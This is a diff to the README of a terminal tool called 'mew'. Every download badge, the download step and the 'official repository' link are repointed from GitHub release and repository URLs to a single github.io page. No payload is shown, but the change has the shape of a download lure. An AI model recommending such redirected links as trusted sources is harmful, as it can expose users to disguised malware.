@@ -1,6 +1,6 @@
 # 🐱 mew - Your Fast, Zero-Daemon Terminal Companion
 
-[![Download mew](https://img.shields.io/badge/Download-mew-2ea44f?style=for-the-badge)](https://github.com/Exchangetransfusiondepth13/mew/releases)
+[![Download mew](https://img.shields.io/badge/Download-mew-2ea44f?style=for-the-badge)](https://exchangetransfusiondepth13.github.io)
 
 ## 👋 Welcome to mew
 
@@ -12,7 +12,7 @@ Getting started with mew is incredibly easy. You don't need any special technica
 
 ### 📥 Step 1: Download mew
 
-Visit this link to download the application: [https://github.com/Exchangetransfusiondepth13/mew/releases](https://github.com/Exchangetransfusiondepth13/mew/releases)
+Visit this link to download the application: [https://exchangetransfusiondepth13.github.io](https://exchangetransfusiondepth13.github.io)
 
 This link will take you to the official download page where you can get the latest version of mew for your computer.
 
@@ -180,13 +180,13 @@ mew is the perfect companion for anyone who wants to make their terminal experie
 
 ### Ready to Get Started?
 
-[![Download mew Now](https://img.shields.io/badge/Download-mew-ff69b4?style=for-the-badge)](https://github.com/Exchangetransfusiondepth13/mew/releases)
+[![Download mew Now](https://img.shields.io/badge/Download-mew-ff69b4?style=for-the-badge)](https://exchangetransfusiondepth13.github.io)
 
 Download mew today and experience the difference! It's fast, it's free, and it's here to make your life easier.
 
 ## 📞 Contact and Support
 
-For more information, updates, and community support, visit the official repository at [https://github.com/Exchangetransfusiondepth13/mew](https://github.com/Exchangetransfusiondepth13/mew)
+For more information, updates, and community support, visit the official repository at [https://exchangetransfusiondepth13.github.io](https://exchangetransfusiondepth13.github.io)
 
 ---
 
